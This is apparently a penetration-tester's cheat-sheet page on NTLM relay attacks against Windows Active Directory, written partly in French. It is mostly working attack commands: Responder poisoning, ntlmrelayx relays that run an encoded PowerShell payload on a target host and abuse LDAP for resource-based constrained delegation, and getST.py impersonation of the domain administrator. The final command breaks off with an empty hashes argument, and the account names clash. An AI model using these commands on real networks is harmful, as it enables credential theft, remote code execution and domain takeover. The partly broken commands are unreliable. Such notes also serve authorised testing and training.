---
title: "Ntlm Relay"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
---
## Basic Ntlm relay
- Get a code execution , after relaying smb :
```sh
#need to admin privileges
sudo ntlmrelayx --no-http-server -smb2support -t 192.168.50.212
-c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

- a appliquer en lan 
```sh 
Responder.py -I enp4s0 -wdFb
ntlmrelayx -tf target.txt -smb2support -i
```

## RBCD (http to ldap)

- RBCD : 
```sh
Responder.py -I enp4s0 -wdFb
ntlmrelayx.py -t ldap://10.2.10.11 -i -6 -wh wpad-lab
ncat -n 127.0.0.1 11000
```
`Disable SMB et HTTP` 

Assuming that our previously compromised computer account is named LA-SRV01-2019, we issue the following command to grant that account RBCD privileges over the relayed LA-WIN11-22H1-1$ account:

```sh
# set_rbcd LA-WIN11-22H2-1$ LA-SRV01-2019$
getST.py -impersonate administrator -spn 'WSMAN/LA-WIN11-22H2-1.babysteps.domain' -dc-ip 10.2.10.11 -hashes 
```
